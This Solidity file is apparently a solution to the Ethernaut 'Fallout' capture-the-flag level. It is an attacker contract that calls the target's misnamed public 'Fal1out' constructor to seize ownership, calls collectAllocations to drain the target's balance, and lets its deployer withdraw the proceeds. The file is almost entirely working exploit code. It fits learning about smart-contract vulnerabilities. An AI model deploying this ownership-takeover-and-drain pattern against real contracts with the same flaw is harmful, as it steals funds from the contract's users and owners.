// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface targetInterface {
    function Fal1out() external;

    function collectAllocations() external;
}

contract FalloutAttacker {
    targetInterface private target;
    address private owner;

    constructor(address targetAddress_) {
        target = targetInterface(targetAddress_);
        owner = msg.sender;
    }

    function attack() public {
        target.Fal1out();
    }

    function collectAllocations() public {
        target.collectAllocations();
    }

    function withdraw() public {
        require(msg.sender == owner, "You are not the owner!");
        payable(msg.sender).transfer(address(this).balance);
    }
}
